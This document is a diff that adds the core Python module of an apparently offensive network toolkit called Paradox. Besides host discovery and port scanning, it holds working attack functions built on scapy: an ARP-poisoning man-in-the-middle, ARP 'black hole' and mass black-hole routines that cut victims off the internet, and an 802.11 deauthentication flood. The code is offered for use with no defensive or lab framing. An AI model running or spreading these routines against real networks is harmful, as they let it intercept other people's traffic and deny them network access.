@@ -1,1 +1,712 @@
-PLACEHOLDER_CORE_SEE_RELEASE
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+paradox.core — shared foundation for the Paradox suite
+"""
+
+from __future__ import annotations
+
+import os
+import sys
+import socket
+import struct
+import subprocess
+import threading
+import time
+import random
+import re
+import json
+import signal
+import ipaddress
+from dataclasses import dataclass, field
+from typing import Optional, Callable
+from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor
+
+try:
+    from rich.console import Console
+    from rich.table import Table
+    from rich.panel import Panel
+    from rich.prompt import Prompt
+    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+    from rich import box
+except ImportError:
+    print("[!] pip install rich")
+    sys.exit(1)
+
+console = Console()
+
+# ─── constants ──────────────────────────────────────────────────────────────
+
+VERSION = "3.0.0"
+SEV_WEIGHT = {"LOW": 1, "MEDIUM": 3, "HIGH": 7, "CRITICAL": 15}
+
+OUI_TABLE: dict[str, str] = {
+    "00:50:56": "VMware", "00:0c:29": "VMware", "00:50:f2": "Microsoft",
+    "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi", "e4:5f:01": "Raspberry Pi",
+    "94:65:2d": "Apple", "f0:b4:29": "Apple", "3c:22:fb": "Apple",
+    "78:4f:43": "Apple", "00:1b:63": "Apple", "28:d2:44": "Samsung",
+    "8c:77:12": "Samsung", "00:16:3e": "Xen/AWS", "52:54:00": "QEMU/KVM",
+    "00:1c:bf": "Intel", "70:3a:51": "Intel", "18:60:24": "Huawei",
+    "d8:49:2f": "Xiaomi", "00:11:32": "Synology", "68:7f:74": "TP-Link",
+    "cc:2d:e0": "TP-Link", "00:1a:a0": "Dell", "fc:aa:14": "ASUSTek",
+    "04:d4:c4": "ASUSTek", "00:e0:4c": "Realtek", "a4:c3:f0": "Google",
+    "08:00:27": "VirtualBox", "14:91:82": "Ubiquiti", "24:a4:3c": "Ubiquiti",
+    "b4:fb:e4": "Fortinet", "00:09:0f": "Fortinet", "2c:c8:1b": "MikroTik",
+    "d4:ca:6d": "MikroTik", "1c:98:ec": "HP", "3c:d9:2b": "HP",
+}
+
+PORT_SERVICE: dict[int, str] = {
+    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
+    80: "HTTP", 110: "POP3", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS",
+    445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
+    5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
+    2375: "Docker-API", 27017: "MongoDB", 9200: "Elasticsearch",
+}
+
+COMMON_PORTS = [
+    21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 1433, 1521,
+    2375, 3000, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 8888,
+    9000, 9200, 11211, 27017,
+]
+
+# ─── data models ────────────────────────────────────────────────────────────
+
+@dataclass
+class Host:
+    ip: str
+    mac: str = "unknown"
+    vendor: str = "unknown"
+    hostname: str = "unknown"
+    os_guess: str = "unknown"
+    ttl: int = 0
+    open_ports: dict = field(default_factory=dict)   # port -> banner
+    findings: list = field(default_factory=list)
+    risk_score: int = 0
+    alive: bool = True
+
+    def add_finding(self, desc: str, sev: str, rem: str = "", cve: str = "") -> None:
+        self.findings.append({
+            "description": desc, "severity": sev,
+            "remediation": rem, "cve": cve,
+        })
+        self.risk_score += SEV_WEIGHT.get(sev, 0)
+
+
+@dataclass
+class NetworkInfo:
+    iface: str = ""
+    ssid: str = "unknown"
+    bssid: str = "unknown"
+    channel: int = 0
+    signal_dbm: int = 0
+    frequency: str = ""
+    encryption: str = ""
+    our_ip: str = ""
+    our_mac: str = ""
+    gateway_ip: str = ""
+    gateway_mac: str = ""
+    subnet_cidr: str = ""
+
+
+# ─── root / env helpers ─────────────────────────────────────────────────────
+
+def require_root() -> None:
+    if hasattr(os, "geteuid") and os.geteuid() != 0:
+        console.print("[bold red][!] Root required. Use: sudo python3 ...[/bold red]")
+        sys.exit(1)
+
+
+def get_vendor(mac: str) -> str:
+    if not mac or mac == "unknown":
+        return "Unknown"
+    prefix = mac[:8].lower().replace("-", ":")
+    return OUI_TABLE.get(prefix, "Unknown")
+
+
+def get_default_iface() -> str:
+    try:
+        out = subprocess.check_output(
+            ["ip", "route", "show", "default"], text=True, stderr=subprocess.DEVNULL
+        )
+        for line in out.splitlines():
+            if "dev" in line:
+                parts = line.split()
+                return parts[parts.index("dev") + 1]
+    except Exception:
+        pass
+    for name in ("wlan0", "wlan1", "wlp2s0", "eth0", "en0"):
+        if Path(f"/sys/class/net/{name}").exists():
+            return name
+    try:
+        links = [x for x in os.listdir("/sys/class/net") if x != "lo"]
+        if links:
+            return links[0]
+    except Exception:
+        pass
+    return "wlan0"
+
+
+def get_local_ip(iface: str) -> str:
+    try:
+        out = subprocess.check_output(
+            ["ip", "-4", "addr", "show", iface], text=True, stderr=subprocess.DEVNULL
+        )
+        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
+        if m:
+            return m.group(1)
+    except Exception:
+        pass
+    return "127.0.0.1"
+
+
+def get_local_cidr(iface: str) -> str:
+    try:
+        out = subprocess.check_output(
+            ["ip", "addr", "show", iface], text=True, stderr=subprocess.DEVNULL
+        )
+        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", out)
+        if m:
+            return str(ipaddress.IPv4Network(f"{m.group(1)}/{m.group(2)}", strict=False))
+    except Exception:
+        pass
+    return "192.168.1.0/24"
+
+
+def get_gateway_ip() -> str:
+    try:
+        out = subprocess.check_output(
+            ["ip", "route", "show", "default"], text=True, stderr=subprocess.DEVNULL
+        )
+        for line in out.splitlines():
+            if "default" in line and "via" in line:
+                parts = line.split()
+                return parts[parts.index("via") + 1]
+    except Exception:
+        pass
+    return ""
+
+
+def resolve_mac(ip: str, iface: str = "") -> str:
+    """Resolve MAC via ARP (scapy preferred, then system arp)."""
+    try:
+        from scapy.all import getmacbyip
+        mac = getmacbyip(ip)
+        if mac:
+            return mac.lower()
+    except Exception:
+        pass
+    try:
+        subprocess.run(
+            ["ping", "-c", "1", "-W", "1", ip],
+            capture_output=True, timeout=2,
+        )
+        out = subprocess.check_output(["arp", "-n", ip], text=True, stderr=subprocess.DEVNULL)
+        m = re.search(
+            r"([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})",
+            out, re.I,
+        )
+        if m:
+            return m.group(1).lower()
+    except Exception:
+        pass
+    return "unknown"
+
+
+def ttl_os_guess(ttl: int) -> str:
+    if ttl <= 0:
+        return "unknown"
+    if 60 <= ttl <= 65:
+        return "Linux / Android"
+    if 126 <= ttl <= 129:
+        return "Windows"
+    if 253 <= ttl <= 256:
+        return "Cisco / Network Device"
+    if ttl > 100:
+        return "Windows (NAT)"
+    if ttl > 60:
+        return "Linux (NAT)"
+    return f"Unknown (TTL={ttl})"
+
+
+def icmp_ttl(ip: str) -> int:
+    try:
+        out = subprocess.check_output(
+            ["ping", "-c", "1", "-W", "1", ip],
+            text=True, stderr=subprocess.DEVNULL, timeout=3,
+        )
+        m = re.search(r"ttl=(\d+)", out, re.I)
+        if m:
+            return int(m.group(1))
+    except Exception:
+        pass
+    return 0
+
+
+def resolve_hostname(ip: str) -> str:
+    try:
+        return socket.gethostbyaddr(ip)[0]
+    except Exception:
+        return "unknown"
+
+
+# ─── network info ───────────────────────────────────────────────────────────
+
+def collect_network_info(iface: str) -> NetworkInfo:
+    net = NetworkInfo(iface=iface)
+    net.our_ip = get_local_ip(iface)
+    net.subnet_cidr = get_local_cidr(iface)
+    net.gateway_ip = get_gateway_ip()
+
+    try:
+        net.our_mac = Path(f"/sys/class/net/{iface}/address").read_text().strip().lower()
+    except Exception:
+        try:
+            out = subprocess.check_output(
+                ["ip", "link", "show", iface], text=True, stderr=subprocess.DEVNULL
+            )
+            m = re.search(r"link/ether\s+([0-9a-f:]+)", out)
+            if m:
+                net.our_mac = m.group(1).lower()
+        except Exception:
+            pass
+
+    if net.gateway_ip:
+        net.gateway_mac = resolve_mac(net.gateway_ip, iface)
+
+    # WiFi details via iw
+    try:
+        out = subprocess.check_output(
+            ["iw", "dev", iface, "link"], text=True, stderr=subprocess.DEVNULL
+        )
+        m = re.search(r"Connected to ([0-9a-f:]+)", out, re.I)
+        if m:
+            net.bssid = m.group(1).lower()
+        m = re.search(r"SSID: (.+)", out)
+        if m:
+            net.ssid = m.group(1).strip()
+        m = re.search(r"signal: (-\d+)", out)
+        if m:
+            net.signal_dbm = int(m.group(1))
+        m = re.search(r"freq: (\d+)", out)
+        if m:
+            freq = int(m.group(1))
+            net.frequency = f"{freq} MHz"
+            if 2412 <= freq <= 2484:
+                net.channel = (freq - 2412) // 5 + 1
+            elif freq >= 5180:
+                net.channel = (freq - 5000) // 5
+    except Exception:
+        pass
+
+    if net.ssid == "unknown":
+        try:
+            out = subprocess.check_output(
+                ["iwconfig", iface], text=True, stderr=subprocess.DEVNULL
+            )
+            m = re.search(r'ESSID:"([^"]+)"', out)
+            if m:
+                net.ssid = m.group(1)
+            m = re.search(r"Access Point: ([0-9A-Fa-f:]+)", out)
+            if m:
+                net.bssid = m.group(1).lower()
+        except Exception:
+            pass
+
+    return net
+
+
+def print_network_info(net: NetworkInfo) -> None:
+    t = Table(title="[bold red]Active Network[/bold red]", box=box.SIMPLE_HEAD)
+    t.add_column("Field", style="bold cyan", width=16)
+    t.add_column("Value", style="green")
+    for label, val in [
+        ("SSID", net.ssid),
+        ("BSSID (AP)", net.bssid),
+        ("Channel", str(net.channel) if net.channel else "?"),
+        ("Signal", f"{net.signal_dbm} dBm" if net.signal_dbm else "?"),
+        ("Our IP", net.our_ip),
+        ("Our MAC", net.our_mac),
+        ("Gateway IP", net.gateway_ip),
+        ("Gateway MAC", net.gateway_mac),
+        ("Subnet", net.subnet_cidr),
+        ("Interface", net.iface),
+    ]:
+        t.add_row(label, val or "—")
+    console.print(t)
+
+
+# ─── discovery ──────────────────────────────────────────────────────────────
+
+def arp_scan(cidr: str, iface: str, timeout: float = 2.5) -> list[Host]:
+    hosts: list[Host] = []
+    console.print(f"[yellow][*] ARP scan {cidr} on {iface}...[/yellow]")
+    try:
+        from scapy.all import ARP, Ether, srp
+        ans, _ = srp(
+            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
+            timeout=timeout, verbose=False, iface=iface,
+        )
+        for _, rcv in ans:
+            ip = rcv.psrc
+            mac = rcv.hwsrc.lower()
+            ttl = icmp_ttl(ip)
+            hosts.append(Host(
+                ip=ip, mac=mac, vendor=get_vendor(mac),
+                hostname=resolve_hostname(ip),
+                os_guess=ttl_os_guess(ttl), ttl=ttl,
+            ))
+    except ImportError:
+        console.print("[red][!] pip install scapy[/red]")
+    except Exception as e:
+        console.print(f"[red][!] ARP scan: {e}[/red]")
+
+    # supplement from kernel ARP cache
+    try:
+        for line in Path("/proc/net/arp").read_text().splitlines()[1:]:
+            parts = line.split()
+            if len(parts) < 4:
+                continue
+            ip, mac, flags = parts[0], parts[3].lower(), parts[2]
+            if mac in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff") or flags == "0x0":
+                continue
+            if any(h.ip == ip for h in hosts):
+                continue
+            ttl = icmp_ttl(ip)
+            hosts.append(Host(
+                ip=ip, mac=mac, vendor=get_vendor(mac),
+                hostname=resolve_hostname(ip),
+                os_guess=ttl_os_guess(ttl), ttl=ttl,
+            ))
+    except Exception:
+        pass
+
+    console.print(f"[green][+] {len(hosts)} hosts discovered[/green]")
+    return hosts
+
+
+def print_hosts(hosts: list[Host], title: str = "Hosts") -> None:
+    t = Table(title=f"[bold red]{title}[/bold red]", box=box.MINIMAL_DOUBLE_HEAD)
+    t.add_column("#", style="bold cyan", width=4)
+    t.add_column("IP", style="green", width=15)
+    t.add_column("MAC", style="dim", width=18)
+    t.add_column("Vendor", style="yellow", width=14)
+    t.add_column("Hostname", style="dim", width=20)
+    t.add_column("OS", style="magenta", width=16)
+    t.add_column("Ports", style="red", width=16)
+    t.add_column("Risk", style="bold red", justify="right", width=5)
+    for i, h in enumerate(hosts, 1):
+        ports = ",".join(str(p) for p in sorted(h.open_ports)[:5]) or "—"
+        t.add_row(
+            str(i), h.ip, h.mac, h.vendor[:13],
+            h.hostname[:19], h.os_guess[:15], ports, str(h.risk_score),
+        )
+    console.print(t)
+
+
+def select_host(hosts: list[Host]) -> Optional[Host]:
+    if not hosts:
+        console.print("[red]No hosts. Run discovery first.[/red]")
+        return None
+    print_hosts(hosts)
+    raw = Prompt.ask("Select host # (0=cancel)", default="0")
+    try:
+        idx = int(raw) - 1
+        if 0 <= idx < len(hosts):
+            return hosts[idx]
+    except ValueError:
+        pass
+    return None
+
+
+# ─── port scan ──────────────────────────────────────────────────────────────
+
+def grab_banner(ip: str, port: int, timeout: float = 2.0) -> str:
+    probes = {
+        80: b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
+        8080: b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
+        443: b"",
+        22: b"",
+        21: b"",
+        6379: b"PING\r\n",
+    }
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((ip, port))
+        probe = probes.get(port, b"")
+        if probe:
+            s.sendall(probe)
+        else:
+            time.sleep(0.2)
+        data = s.recv(1024).decode("utf-8", errors="ignore").strip()
+        s.close()
+        return data[:120]
+    except Exception:
+        return ""
+
+
+def scan_ports(host: Host, ports: list[int] | None = None, workers: int = 20) -> None:
+    if ports is None:
+        ports = COMMON_PORTS
+    console.print(f"[yellow][*] Port scan {host.ip} ({len(ports)} ports)...[/yellow]")
+
+    def _check(port: int) -> None:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.7)
+            if s.connect_ex((host.ip, port)) == 0:
+                s.close()
+                banner = grab_banner(host.ip, port)
+                host.open_ports[port] = banner
+                console.print(f"[green]   OPEN {port}/{PORT_SERVICE.get(port, '?')}  {banner[:50]}[/green]")
+            else:
+                s.close()
+        except Exception:
+            pass
+
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        pool.map(_check, ports)
+
+
+# ─── attack primitives ──────────────────────────────────────────────────────
+
+def arp_poison(victim_ip: str, gateway_ip: str, iface: str) -> None:
+    """Bidirectional ARP MITM. Ctrl-C restores."""
+    console.print(f"[bold red][*] ARP MITM  {victim_ip} ↔ {gateway_ip}[/bold red]")
+    try:
+        from scapy.all import ARP, Ether, sendp, get_if_hwaddr
+    except ImportError:
+        console.print("[red]pip install scapy[/red]")
+        return
+
+    victim_mac = resolve_mac(victim_ip, iface)
+    gateway_mac = resolve_mac(gateway_ip, iface)
+    our_mac = get_if_hwaddr(iface)
+
+    if victim_mac == "unknown" or gateway_mac == "unknown":
+        console.print("[red][-] MAC resolution failed[/red]")
+        return
+
+    try:
+        Path("/proc/sys/net/ipv4/ip_forward").write_text("1\n")
+    except Exception:
+        pass
+
+    pkt_v = Ether(dst=victim_mac, src=our_mac) / ARP(
+        op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=our_mac
+    )
+    pkt_g = Ether(dst=gateway_mac, src=our_mac) / ARP(
+        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=our_mac
+    )
+
+    stop = threading.Event()
+
+    def _loop() -> None:
+        while not stop.is_set():
+            try:
+                sendp([pkt_v, pkt_g], iface=iface, verbose=False)
+            except Exception:
+                pass
+            time.sleep(1.5)
+
+    t = threading.Thread(target=_loop, daemon=True)
+    t.start()
+    console.print("[green][+] MITM active. Ctrl-C to stop + restore.[/green]")
+    try:
+        while True:
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        stop.set()
+        restore_v = Ether(dst=victim_mac, src=gateway_mac) / ARP(
+            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac
+        )
+        restore_g = Ether(dst=gateway_mac, src=victim_mac) / ARP(
+            op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac
+        )
+        try:
+            sendp([restore_v, restore_g] * 5, iface=iface, verbose=False)
+            console.print("[green][+] ARP restored.[/green]")
+        except Exception:
+            pass
+        try:
+            Path("/proc/sys/net/ipv4/ip_forward").write_text("0\n")
+        except Exception:
+            pass
+
+
+def arp_blackhole(victim_ip: str, gateway_ip: str, iface: str, duration: int = 0) -> None:
+    """Cut victim internet by poisoning gateway MAC to a dead address. No monitor mode needed."""
+    console.print(f"[bold red][*] ARP Black Hole → {victim_ip}[/bold red]")
+    try:
+        from scapy.all import ARP, Ether, sendp
+    except ImportError:
+        console.print("[red]pip install scapy[/red]")
+        return
+
+    victim_mac = resolve_mac(victim_ip, iface)
+    if victim_mac == "unknown":
+        console.print(f"[red][-] Cannot resolve MAC for {victim_ip}[/red]")
+        return
+
+    dead = "de:ad:00:00:be:ef"
+    poison = Ether(dst=victim_mac, src=dead) / ARP(
+        op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=dead
+    )
+    stop = threading.Event()
+    start = time.time()
+
+    def _loop() -> None:
+        while not stop.is_set():
+            try:
+                sendp(poison, iface=iface, verbose=False)
+            except Exception:
+                pass
+            if duration and (time.time() - start) >= duration:
+                stop.set()
+            time.sleep(1.0)
+
+    t = threading.Thread(target=_loop, daemon=True)
+    t.start()
+    console.print("[green][+] Internet cut. Ctrl-C to restore.[/green]")
+    try:
+        while not stop.is_set():
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop.set()
+        real_gw = resolve_mac(gateway_ip, iface)
+        if real_gw != "unknown":
+            restore = Ether(dst=victim_mac, src=real_gw) / ARP(
+                op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=real_gw
+            )
+            try:
+                sendp([restore] * 5, iface=iface, verbose=False)
+                console.print("[green][+] ARP restored.[/green]")
+            except Exception:
+                pass
+
+
+def mass_arp_blackhole(targets: list[Host], gateway_ip: str, iface: str) -> None:
+    """Black-hole every target at once."""
+    console.print(f"[bold red][*] Mass ARP Black Hole — {len(targets)} clients[/bold red]")
+    try:
+        from scapy.all import ARP, Ether, sendp
+    except ImportError:
+        console.print("[red]pip install scapy[/red]")
+        return
+
+    dead = "de:ad:00:00:be:ef"
+    pkts = []
+    for c in targets:
+        if c.mac == "unknown":
+            continue
+        pkts.append(
+            Ether(dst=c.mac, src=dead) / ARP(
+                op=2, pdst=c.ip, hwdst=c.mac, psrc=gateway_ip, hwsrc=dead
+            )
+        )
+    if not pkts:
+        console.print("[red]No valid MACs to poison.[/red]")
+        return
+
+    stop = threading.Event()
+
+    def _loop() -> None:
+        while not stop.is_set():
+            try:
+                sendp(pkts, iface=iface, verbose=False)
+            except Exception:
+                pass
+            time.sleep(1.0)
+
+    t = threading.Thread(target=_loop, daemon=True)
+    t.start()
+    console.print(f"[green][+] {len(pkts)} clients cut. Ctrl-C to stop.[/green]")
+    try:
+        while True:
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        stop.set()
+        console.print("[yellow][*] Stopped. ARP tables will age out / restore on next real traffic.[/yellow]")
+
+
+def deauth_flood(iface: str, bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff", count: int = 0) -> None:
+    """802.11 deauth. Requires monitor mode."""
+    console.print(f"[bold red][*] Deauth → AP {bssid}  client {client_mac}[/bold red]")
+    try:
+        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+    except ImportError:
+        console.print("[red]pip install scapy[/red]")
+        return
+
+    pkt = (
+        RadioTap()
+        / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
+        / Dot11Deauth(reason=7)
+    )
+    stop = threading.Event()
+    sent = [0]
+
+    def _loop() -> None:
+        while not stop.is_set():
+            try:
+                n = 64 if count == 0 else min(64, count - sent[0])
+                if n <= 0:
+                    stop.set()
+                    break
+                sendp(pkt, iface=iface, verbose=False, count=n)
+                sent[0] += n
+            except Exception:
+                pass
+            time.sleep(0.05)
+
+    t = threading.Thread(target=_loop, daemon=True)
+    t.start()
+    console.print("[green][+] Deauth running. Ctrl-C to stop.[/green]")
+    try:
+        while not stop.is_set():
+            time.sleep(0.5)
+            console.print(f"[dim]   frames: {sent[0]}[/dim]", end="\r")
+    except KeyboardInterrupt:
+        stop.set()
+    console.print(f"\n[green][+] Stopped. Total frames: {sent[0]}[/green]")
+
+
+def setup_monitor_mode(iface: str) -> Optional[str]:
+    console.print(f"[yellow][*] Enabling monitor mode on {iface}...[/yellow]")
+    try:
+        subprocess.run(["ip", "link", "set", iface, "down"], check=True, capture_output=True)
+        subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], check=True, capture_output=True)
+        subprocess.run(["ip", "link", "set", iface, "up"], check=True, capture_output=True)
+        console.print(f"[green][+] {iface} is now monitor mode[/green]")
+        return iface
+    except Exception:
+        pass
+    try:
+        out = subprocess.check_output(
+            ["airmon-ng", "start", iface], text=True, stderr=subprocess.DEVNULL
+        )
+        m = re.search(r"monitor mode .* (?:on|for) (\S+)", out, re.I)
+        if m:
+            mon = m.group(1).strip("[]()")
+            console.print(f"[green][+] Monitor iface: {mon}[/green]")
+            return mon
+    except Exception:
+        pass
+    console.print("[red][-] Monitor mode failed. External USB adapter usually required on Android.[/red]")
+    return None
+
+
+# ─── small utils ────────────────────────────────────────────────────────────
+
+def safe_int(raw: str, default: int = 0) -> int:
+    try:
+        return int(raw)
+    except ValueError:
+        return default
+
+
+def confirm(msg: str, default: str = "no") -> bool:
+    return Prompt.ask(f"[bold red]{msg}[/bold red]", default=default).lower() in ("y", "yes")
